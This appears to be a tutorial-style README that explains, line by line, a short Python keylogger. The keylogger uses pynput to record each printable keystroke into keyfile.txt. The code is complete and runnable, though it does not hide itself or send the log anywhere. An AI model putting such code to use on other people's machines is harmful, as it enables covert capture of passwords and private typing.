# Keylogger Script

This script listens to keyboard events and logs keystrokes to a file named `keyfile.txt`. Below is a detailed explanation of what each line of the code does.

---

## Code Breakdown

```python
from pynput import keyboard
```
Purpose: Imports the keyboard module from the pynput library. This library allows programs to monitor and control keyboard inputs.

```python
def keyPressed(key):
```
Purpose: Defines a function named keyPressed that gets called whenever a key is pressed.

Parameter:
- key: Represents the key that was pressed, provided automatically by the pynput listener.

```python
    print(str(key))
```
Purpose: Converts the key object to a string and prints it to the console. This includes keys such as letters ('a'), special keys (Key.enter), or other non-character keys.

```python
    with open("keyfile.txt", 'a') as logkey:
```
Purpose: Opens (or creates, if it doesn’t exist) a file named keyfile.txt in append mode ('a'). The file is assigned to the variable logkey, and the with statement ensures the file is properly closed after use.

```python
        try:
            char = key.char
```
Purpose: Attempts to retrieve the char attribute of the key object. This represents the printable character of the key (e.g., 'a' for the A key).

- Key Insight: Special keys (like Shift, Ctrl, etc.) do not have a char attribute and will raise an exception.

```python
            logkey.write(char)
```
Purpose: If char was successfully retrieved, writes the character to keyfile.txt.

```python
        except:
            print("Error getting char")
```
Purpose: If an exception occurs (e.g., the key pressed doesn’t have a char attribute), it prints an error message instead of crashing the program.

```python
if __name__ == "__main__":
```
Purpose: This checks if the script is being run directly (not imported as a module). If true, the block of code below this line will execute.

```python
    listener = keyboard.Listener(on_press=keyPressed)
```
Purpose: Creates a keyboard.Listener object that listens for keyboard events. The on_press argument specifies the keyPressed function as the callback to execute when a key is pressed.

```python
    listener.start()
```
Purpose: Starts the keyboard.Listener, enabling it to begin listening for key press events.

```python
    input()
```
Purpose: Keeps the program running by waiting for user input. Without this line, the script would terminate immediately, stopping the listener.












